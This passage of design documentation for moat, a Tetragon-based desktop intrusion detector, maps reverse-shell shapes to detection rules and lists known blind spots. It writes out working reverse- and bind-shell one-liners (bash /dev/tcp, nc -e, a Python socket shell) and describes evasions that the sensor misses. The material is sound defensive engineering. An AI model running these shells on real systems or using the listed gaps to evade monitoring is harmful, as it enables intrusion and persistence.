4. **Hostnames, DNS and registry allowlists.** Kernel-side there are IPs, ports
   and CIDRs only. `moat-x-pkg-egress` (destination not in the registry
   allowlist) is userland, resolving the IP from the event.
5. **IOC lookups** — sha256 of a newly executed file, feed domains/URLs
   (`moat-x-new-exec-ioc`). Policies carry no hashing; hash
   `process.binary` in userspace.
6. **`LD_PRELOAD` and any other environment variable.** No selector exists;
   read it from `process_exec.process.environment_variables`, which is why
   `enable-process-environment-variables` + `filter-environment-variables=LD_PRELOAD`
   are in `tetragon.conf.d`. The `/etc/ld.so.preload` file itself *is* covered
   by a policy.
7. **Counting and windows.** `rateLimit` suppresses, it never counts, and it
   has no notion of "40 distinct files in 10 s" (`moat-x-mass-read`). Note
   the rate-limit key is *thread + the first 40 bytes of the arguments*: two
   credential paths that share a 40-byte prefix collapse into one event, so a
   userland count of distinct files read is a **lower bound**. If mass-read
   proves lossy, drop `rateLimit` from the `cred` policies and dedupe entirely
   in moatd.
8. **Whether a kill actually happened** — see the monitor/enforce section.
   Confirm with `process_exit.signal == SIGKILL`.
9. **Policy-name prefix matching in the export filter.** `policy_names` is an
   exact match; moatd writes the explicit list
   (`export-allowlist.example`). The CEL `startsWith` form in the notes is
   untested live and is not used.
10. **Policy hot reload.** There is none: `moatd render-policies` runs as
    `ExecStartPre` and a policy change means restarting tetragon (or
    `tetra tp add|delete`).
11. **Dedupe, severity escalation and correlation** — an interpreter spawned by
    a package install, followed by a credential read and an egress event from
    the same subtree, is one high-value incident, not three rows. Severity
    escalation is now load-bearing rather than cosmetic:
    `net-suspicious-port-egress` ships at medium and moatd raises it to high
    when the process is in a package-manager subtree, because that context only
    exists in userland.
12. **File descriptors.** No hook Tetragon exposes carries a process's open
    fds, and there is no selector for "stdin is a socket" — the exec event says
    what ran, never what it was handed. `moat-shell-stdio-socket` reads
    `/proc/<pid>/fd/{0,1,2}` of the new process at exec time and resolves any
    socket inode through `/proc/net/{tcp,tcp6,udp,udp6}`, which is the only way
    to see an interpreter reverse shell at all (see below).

### Reverse shells: the three shapes and which rule catches each

| Shape | What the kernel sees | Caught by |
|---|---|---|
| `bash -i >& /dev/tcp/HOST/4444 0>&1`, `nc -e /bin/sh HOST 4444`, `socat ... EXEC:` | the **shell itself** calls `tcp_connect` | `moat-shell-reverse-shell-connect` (critical, Sigkill) for a public host; `moat-shell-lan-connect` (high, report-only) for 10/8, 172.16/12, 192.168/16, `fc00::/7` |
| `python -c 'import socket,os,subprocess; s.connect(("HOST",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'`, and the perl / php / ruby / node / java equivalents | the **interpreter** connects; the shell it execs never touches the network, and interpreters are not in any shell policy's `matchBinaries` | `moat-shell-stdio-socket` (userland): fds 0/1/2 of the new shell are a socket. Critical for an off-machine peer, medium for loopback, LAN included |
| the pty upgrade — `python -c 'import pty;pty.spawn("/bin/bash")'`, `script /dev/null`, run inside a shell that already has the socket | nothing at all: the socket stays on the parent's stdio and the new shell gets a fresh `/dev/pts/N` | `moat-shell-stdio-socket` rung 2 (high): the shell's stdio is a pty **and the parent's stdio is a socket**. Deliberately not "the parent holds a socket somewhere" — every IDE, language server and dev server does that |

The honest residual: a reverse shell whose stdio is neither a socket nor a pty
over one — a custom agent that keeps the connection to itself and proxies
commands into a shell over a pipe, an implant that runs commands with
`popen()` and posts the output over HTTPS — is invisible to all three rules.
What is left of it is `moat-net-first-contact` (low, timeline) plus whatever
else the same process tree does, correlated by `chain.rs`. That is a real
weakness of the family, not an oversight: at that point nothing about the
process is shell-shaped, and only the sequence gives it away.

### Known blind spots (nothing covers these yet)

* **Rename-based writes.** A payload that writes `~/.bashrc.tmp` and renames it
  over `~/.bashrc` never opens the target for writing, so the `persist` rules
  miss it. `security_path_rename` and `path_unlink` are hookable; adding them
  would mean a second BPF program per persist rule and was left out for
  desktop cost. Same for writes through an already-open fd inherited across an
  exec.
* **Bind shells**, in the kernel. `tcp_connect` only sees outbound connections;
  a shell that listens is not covered by any policy (`security_socket_bind`
  would be the hook). Since 2026-09-05 the common case is caught in userland
  anyway: `nc -lvp 4444 -e /bin/sh` hands the accepted socket to the shell on
  fds 0/1/2, which is `moat-shell-stdio-socket`. What is still missed is the
  listener that has not been connected to yet, and one that never gives the
  socket to a shell.
* **Reads of credentials with non-standard names**, and any credential file in
  a directory this list does not enumerate.
* **Container-internal activity** is seen as host activity; there is no
  per-container scoping on a single-user desktop.
* **An agent socket under `/run/user/<uid>/`.** `sockaddr_un` takes `Equal` and
  `Prefix` only — no `Postfix` — and the user id sits in the middle of the path,
  so the systemd, gcr and gnome-keyring ssh-agents cannot be named in a
  template. A `Prefix` of `/run/user/` would match every desktop socket on the
  machine. `moat-cred-ssh-agent-socket` covers `/tmp/ssh-*` and `$HOME` agents
  only; the rest needs a `{{UID}}` placeholder in the renderer, or a userspace
  match on `SSH_AUTH_SOCK`.
* **`> ~/.bash_history` typed at a prompt.** The shell performs that redirection
  itself, and a shell truncates its own history file on every exit when
  `histappend` is off, so the two are the same event from the kernel's side.
  `moat-rootkit-history-tamper` excludes the shells and therefore sees only a
  non-shell erasing history.
* **Stopping the sensor by signal.** `systemctl stop moatd` and `kill -9` reach
  `security_task_kill`, whose victim is a `task_struct` — no operator can match
  "the target is moatd", so a policy there would fire on every signal on the
  machine. Noticing that the sensor died stays a userspace job
  (`moat-x-sensor-mismatch`), as does `systemctl mask`, which creates a symlink
  rather than writing a file.
* **Lockfile tampering** (`package-lock.json`, `Cargo.lock`, …). The
  discriminator is whether an install is running, not who is writing: the
  legitimate writers are node, python and cargo, which is also what an attacker
  edits them with. An in-kernel exclusion list would be "every package manager",
  which leaves the rule matching nothing. It belongs in userspace, where the
  install context of BASELINE 2b is already known.
* **Timestomping and `chattr +i`.** `utimensat` is what `tar`, `cp -p`, `rsync`
  and every package manager do thousands of times per build, and `chattr` goes
  through `security_file_ioctl`, which fires on every ioctl on the machine. Both
  would cost more than they detect; an immutable flag on moat's own files is
  better checked periodically from userspace.
* **`~/.pki/nssdb`.** Adding a certificate there is real, but browsers and
  Electron apps rewrite that database on their own schedule; the system trust
  store (`moat-rootkit-trust-store-write`) is covered instead.
* **Ransomware outside the document directories, and the one shape inside
  them that leaves no trace.** `moat-ransom-file-churn` watches ~/Documents,
  ~/Desktop, ~/Pictures, ~/Videos, ~/Music and ~/Downloads. A sweep of
  `~/Projects` alone — the build trees — is not seen, by choice: a $HOME-wide
  read watch sits in the band of the 19-42 events/s (writes alone) that the
  telemetry file class measured under $HOME and the telemetry fork exists to avoid, and
  Prefix cannot say "under $HOME but not under any node_modules" (gap 2). The
  whole-home variant is in `incubating/` with the numbers. Inside the scope, a
  payload that opens each file O_RDWR, overwrites the bytes in place and never
  renames, truncates or unlinks anything produces reads only; every real family
  renames (the victim has to know which files are held), but the shape exists.
  And a payload named `rsync` in its own directory is not excluded — the lists
  are absolute `/usr/bin` paths for exactly that reason — but one that execs
  the real `/usr/bin/rsync --remove-source-files` to do its moving is.
